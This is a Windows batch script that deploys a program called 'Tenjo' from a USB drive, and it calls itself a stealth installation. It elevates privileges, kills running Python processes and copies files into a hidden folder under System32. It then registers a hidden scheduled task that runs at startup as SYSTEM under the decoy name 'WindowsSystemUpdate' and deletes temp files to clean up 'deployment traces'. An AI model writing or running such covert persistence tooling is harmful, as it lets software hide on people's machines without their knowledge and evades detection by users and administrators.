@echo off
:: Tenjo USB Deployment Script
:: Stealth installation from USB drive
setlocal EnableDelayedExpansion

:: Hide command window
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)

:: Log deployment
set LOGFILE=%~dp0deployment.log
echo [%date% %time%] Starting USB deployment >> "%LOGFILE%"

:: Check if Tenjo already running
tasklist /FI "IMAGENAME eq python.exe" 2>NUL | find /I /N "python.exe" >NUL
if "%ERRORLEVEL%"=="0" (
    echo [%date% %time%] Stopping existing Tenjo process >> "%LOGFILE%"
    taskkill /F /IM python.exe >NUL 2>&1
    timeout /t 3 >NUL
)

:: Remove old installation
if exist "C:\Windows\System32\.tenjo" (
    echo [%date% %time%] Removing old installation >> "%LOGFILE%"
    rmdir /S /Q "C:\Windows\System32\.tenjo" >NUL 2>&1
)

:: Create installation directory
mkdir "C:\Windows\System32\.tenjo" >NUL 2>&1
mkdir "C:\Windows\System32\.tenjo\src" >NUL 2>&1
mkdir "C:\Windows\System32\.tenjo\logs" >NUL 2>&1

:: Copy new files
echo [%date% %time%] Copying files from USB >> "%LOGFILE%"
xcopy "%~dp0installer_package\*" "C:\Windows\System32\.tenjo\" /E /Y /Q >NUL 2>&1

:: Install Python dependencies
echo [%date% %time%] Installing dependencies >> "%LOGFILE%"
cd /d "C:\Windows\System32\.tenjo"
python -m pip install -r requirements.txt --quiet >NUL 2>&1

:: Create startup script
echo [%date% %time%] Creating startup mechanism >> "%LOGFILE%"
powershell -Command "
$action = New-ScheduledTaskAction -Execute 'python' -Argument 'C:\Windows\System32\.tenjo\main.py' -WorkingDirectory 'C:\Windows\System32\.tenjo'
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0
$principal = New-ScheduledTaskPrincipal -UserID 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName 'WindowsSystemUpdate' -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
" >NUL 2>&1

:: Start the service
echo [%date% %time%] Starting Tenjo service >> "%LOGFILE%"
start /min python "C:\Windows\System32\.tenjo\main.py"

:: Clean up traces
echo [%date% %time%] Cleaning up deployment traces >> "%LOGFILE%"
del /Q "%TEMP%\*.tmp" >NUL 2>&1
del /Q "%TEMP%\*.log" >NUL 2>&1

echo [%date% %time%] USB deployment completed successfully >> "%LOGFILE%"

:: Auto-hide window after 3 seconds
timeout /t 3 >NUL
exit /b 0